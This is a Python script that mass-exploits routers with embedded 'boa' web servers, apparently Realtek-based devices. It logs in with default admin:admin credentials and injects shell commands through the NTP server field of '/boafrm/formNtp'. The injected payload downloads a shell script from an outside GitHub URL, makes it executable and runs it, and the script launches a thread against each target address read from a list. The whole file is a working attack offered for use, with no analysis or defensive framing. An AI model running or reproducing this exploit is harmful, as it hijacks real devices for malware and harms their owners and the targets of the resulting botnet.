import urllib.request
import urllib.error
from threading import Thread

payload = "wget%20https%3A%2F%2Fraw.githubusercontent.com%2F20Matrix77%2FDHJIF%2Frefs%2Fheads%2Fmain%2Fskfnw.sh%3B%20chmod%20777%20%2A%3B%20sh%20skfnw.sh"
body = "timeZone=3+2&enabled=ON&ntpServerIp1=ca.pool.ntp.org&ntpServerId=1&ntpServerIp2="+payload+"&submit-url=%2Fntp.htm&save_apply=Salvar+%26+Aplicar"

def exploit(target):
    try:
        req = urllib.request.Request("http://"+target+"/boafrm/formNtp")

        req.add_header("host", target)
        req.add_header("Content-Length", "195")
        req.add_header("Authorization", "Basic YWRtaW46YWRtaW4=")
        req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0")
        req.add_header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
        req.add_header("Accept-Language", "en-US,en;q=0.5")
        req.add_header("Accept-Encoding", "gzip, deflate")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        req.add_header("Origin", "http://"+target+"")
        req.add_header("Connection", "keep-alive")
        req.add_header("Referer", "http://"+target+"/ntp.htm")
        req.add_header("Upgrade-Insecure-Requests", "1")

        response = urllib.request.urlopen(req, data=bytes(body, 'utf-8'))

        if response.status == 200:
            print("200 " + target)
    except Exception as e:
        #print(e)
        pass

for line in open('f').readlines():
    Thread(target=exploit, args=(line.rstrip(),)).start()
